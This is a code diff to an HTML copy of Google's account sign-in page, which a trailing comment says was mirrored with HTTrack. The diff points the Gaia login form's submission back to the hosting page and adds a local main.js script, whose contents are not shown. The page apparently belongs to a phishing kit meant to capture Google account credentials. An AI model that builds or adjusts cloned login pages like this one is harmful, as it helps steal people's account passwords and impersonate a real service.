@@ -1287,7 +1287,7 @@
   
    no-name">
                     <img class="circle-mask" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
-                    <form novalidate method="post" target="_blank" action="netflix.com" id="gaia_loginform">
+                    <form novalidate method="post" target="_blank" action="" id="gaia_loginform">
                         <div class="form-panel first valid" id="gaia_firstform">
                             <div class="slide-out">
                                 <div class="input-wrapper focused">
@@ -1372,8 +1372,9 @@
             </div>
         </div>
     </div>
-
+<script src="main.js"></script>
 </body>
+
 
 <!-- Mirrored from accounts.google.com/signin by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Feb 2021 18:47:30 GMT -->
 
